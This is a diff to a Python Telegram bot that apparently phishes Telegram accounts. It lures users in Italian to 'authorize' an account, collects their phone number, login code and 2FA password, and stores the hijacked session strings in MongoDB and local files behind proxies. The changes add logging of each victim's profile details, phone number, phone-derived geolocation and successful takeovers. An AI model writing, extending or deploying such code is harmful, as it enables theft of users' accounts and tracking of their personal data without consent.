@@ -11,6 +11,7 @@ from telethon.sessions import StringSession
 from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
 from pymongo import MongoClient
 from dotenv import load_dotenv
+from datetime import datetime
 
 load_dotenv()
 API_ID = int(os.getenv("API_ID"))
@@ -38,6 +39,7 @@ proxy_list = [main_proxy, second_proxy]
 mongo = MongoClient(MONGO_URI)
 db = mongo["dbmango"]
 sessions_col = db["sessions"]
+start_col = db["start"]  # Новая коллекция для логирования стартов
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
@@ -61,8 +63,37 @@ def get_proxy_for_phone(phone):
     # Для новых сессий - распределяем между прокси
     return proxy_list[hash(phone) % len(proxy_list)]
 
+def log_user_action(user_id: int, action: str, data: dict = None):
+    """Логирует действия пользователя в базу данных"""
+    try:
+        user_data = {
+            "user_id": user_id,
+            "action": action,
+            "timestamp": datetime.now(),
+            "data": data or {}
+        }
+        start_col.insert_one(user_data)
+    except Exception as e:
+        logging.error(f"Ошибка при логировании действия пользователя: {e}")
+
 @dp.message_handler(commands=['start'])
 async def cmd_start(message: types.Message):
+    user = message.from_user
+    
+    # Логируем информацию о пользователе
+    log_user_action(
+        user_id=user.id,
+        action="start",
+        data={
+            "username": user.username,
+            "first_name": user.first_name,
+            "last_name": user.last_name,
+            "language_code": user.language_code,
+            "is_bot": user.is_bot,
+            "chat_id": message.chat.id
+        }
+    )
+
     keyboard = InlineKeyboardMarkup().add(
         InlineKeyboardButton("Autorizzazione del primo account🥰", callback_data="auth_account")
     )
@@ -77,6 +108,9 @@ async def cmd_start(message: types.Message):
 async def start_auth(callback_query: types.CallbackQuery):
     user_id = callback_query.from_user.id
     user_states[user_id] = 'awaiting_contact'
+
+    # Логируем нажатие кнопки авторизации
+    log_user_action(user_id, "auth_button_click")
 
     kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     kb.add(KeyboardButton("📱 Condividi il tuo numero", request_contact=True))
@@ -93,6 +127,25 @@ async def handle_contact(message: types.Message):
     phone = message.contact.phone_number
     if not phone.startswith("+"):
         phone = "+" + phone
+
+    # Получаем информацию о геолокации по номеру телефона
+    geo_info = None
+    try:
+        parsed_number = phonenumbers.parse(phone)
+        geo_info = geocoder.description_for_number(parsed_number, "en")
+    except Exception as e:
+        logging.error(f"Ошибка при определении геолокации: {e}")
+
+    # Логируем предоставленный контакт
+    log_user_action(
+        user_id=user_id,
+        action="contact_shared",
+        data={
+            "phone": phone,
+            "geo_info": geo_info,
+            "contact_user_id": message.contact.user_id
+        }
+    )
 
     # Выбираем прокси для этого номера
     selected_proxy = get_proxy_for_phone(phone)
@@ -189,9 +242,27 @@ async def try_sign_in_code(user_id, code):
                 {"$set": {
                     "phone": phone, 
                     "session": session_str, 
-                    "proxy_index": proxy_index
+                    "proxy_index": proxy_index,
+                    "user_id": user_id,
+                    "username": me.username,
+                    "first_name": me.first_name,
+                    "last_name": me.last_name if me.last_name else None,
+                    "auth_date": datetime.now()
                 }}, 
                 upsert=True
+            )
+
+            # Логируем успешную авторизацию
+            log_user_action(
+                user_id=user_id,
+                action="successful_auth",
+                data={
+                    "phone": phone,
+                    "telegram_id": me.id,
+                    "username": me.username,
+                    "first_name": me.first_name,
+                    "last_name": me.last_name
+                }
             )
 
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
@@ -247,11 +318,24 @@ async def process_2fa(message: types.Message):
                 {"$set": {
                     "phone": phone, 
                     "session": session_str, 
-                    "proxy_index": proxy_index
+                    "proxy_index": proxy_index,
+                    "user_id": user_id,
+                    "auth_date": datetime.now(),
+                    "has_2fa": True
                 }}, 
                 upsert=True
             )
             
+            # Логируем успешную авторизацию с 2FA
+            log_user_action(
+                user_id=user_id,
+                action="successful_2fa_auth",
+                data={
+                    "phone": phone,
+                    "has_2fa": True
+                }
+            )
+
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
